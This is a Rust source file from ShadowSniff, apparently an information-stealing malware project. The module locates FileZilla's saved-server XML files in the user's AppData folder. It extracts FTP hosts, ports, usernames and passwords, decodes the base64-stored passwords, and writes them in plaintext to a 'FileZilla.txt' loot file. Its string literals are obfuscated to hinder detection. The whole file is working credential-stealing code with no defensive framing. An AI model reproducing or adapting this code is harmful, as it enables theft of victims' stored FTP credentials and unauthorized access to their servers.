/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use alloc::borrow::ToOwned;
use alloc::format;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use collector::{Collector, Software};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, WriteTo};
use obfstr::obfstr as s;
use tasks::Task;
use utils::base64::base64_decode;

pub struct FileZillaTask;

impl<C: Collector, F: FileSystem> Task<C, F> for FileZillaTask {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let servers = collect_servers();

        if servers.is_empty() {
            return;
        }

        let mut deduped = Vec::new();

        for server in servers {
            if !deduped.contains(&server) {
                deduped.push(server);
            }
        }

        let servers: Vec<String> = deduped
            .iter()
            .map(|server| {
                let password_decoded = base64_decode(server.password.as_bytes())
                    .map(|decoded| String::from_utf8_lossy(&decoded).to_string());

                let password_str = match password_decoded {
                    Some(ref s) => s.as_str(),
                    None => &server.password,
                };

                format!(
                    "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
                    server.host, server.port, server.user, password_str
                )
            })
            .collect();

        collector
            .get_software()
            .increase_ftp_hosts_by(servers.len());

        let servers = servers.join("\n\n");
        let _ = servers.write_to(filesystem, parent / s!("FileZilla.txt"));
    }
}

fn collect_servers() -> Vec<Server> {
    let mut result: Vec<Server> = Vec::new();
    let base = &Path::appdata() / s!("FileZilla");

    let paths = [
        (
            &base / s!("recentservers.xml"),
            s!("RecentServers").to_owned(),
        ),
        (&base / s!("sitemanager.xml"), s!("Servers").to_owned()),
    ];

    for (path, servers_node) in paths {
        if let Some(servers) = collect_servers_from_path(&StorageFileSystem, &path, servers_node) {
            result.extend(servers)
        }
    }

    result
}

fn collect_servers_from_path<F, S>(
    filesystem: &F,
    path: &Path,
    servers_node: S,
) -> Option<Vec<Server>>
where
    S: AsRef<str>,
    F: FileSystem,
{
    let mut result: Vec<Server> = Vec::new();

    if !filesystem.is_exists(path) {
        return None;
    }

    let bytes = filesystem.read_file(path);

    if bytes.is_err() {
        return None;
    }

    let bytes = bytes.ok()?;
    let content = String::from_utf8(bytes).ok()?;

    parse_servers(&content, servers_node.as_ref())
}

#[derive(PartialEq)]
struct Server {
    host: String,
    port: u16,
    user: String,
    password: String,
}

fn parse_servers(content: &str, servers_node: &str) -> Option<Vec<Server>> {
    let section = extract_section(content, servers_node)?;
    let mut result = Vec::new();

    for block in section.split(s!("<Server")).skip(1) {
        let remainder = if let Some((_, rest)) = block.split_once('>') {
            rest
        } else {
            continue;
        };

        let body = if let Some((body, _)) = remainder.split_once(s!("</Server>")) {
            body
        } else {
            continue;
        };

        let host = extract_field(body, s!("Host"));
        let port = extract_field(body, s!("Port"))
            .parse::<u16>()
            .unwrap_or(0);
        let user = extract_field(body, s!("User"));
        let password = extract_field(body, s!("Pass"));

        result.push(Server {
            host,
            port,
            user,
            password,
        });
    }

    Some(result)
}

fn extract_section<'a>(content: &'a str, node: &str) -> Option<&'a str> {
    let open_tag = format!("<{}>", node);
    let close_tag = format!("</{}>", node);

    let start = content.find(&open_tag)? + open_tag.len();
    let rest = &content[start..];
    let end = rest.find(&close_tag)?;

    Some(&rest[..end])
}

fn extract_field(content: &str, name: &str) -> String {
    let open_tag = format!("<{}>", name);
    let close_tag = format!("</{}>", name);

    if let Some(start) = content.find(&open_tag) {
        let start_idx = start + open_tag.len();
        if let Some(end_rel) = content[start_idx..].find(&close_tag) {
            let value = &content[start_idx..start_idx + end_rel];
            return value.trim().to_string();
        }
    }

    String::new()
}
